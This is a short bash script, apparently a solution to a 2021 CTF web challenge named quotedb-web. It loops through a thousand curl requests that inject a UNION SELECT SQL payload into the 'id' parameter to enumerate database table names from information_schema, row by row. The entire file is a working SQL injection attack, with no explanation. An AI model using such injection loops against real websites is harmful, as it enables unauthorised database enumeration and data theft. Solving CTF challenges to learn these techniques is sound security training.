#!/usr/bin/env bash

for i in {1..1000}; do
  curl -s 'https://quotedb-web.2021.ctfcompetition.com/?id=77%20UNION%20SELECT%20TABLE_CATALOG,TABLE_NAME,TABLE_TYPE%20FROM%20information_schema.tables%20LIMIT%20'${i}',1' | grep '    "' | grep -o '".*"'
done
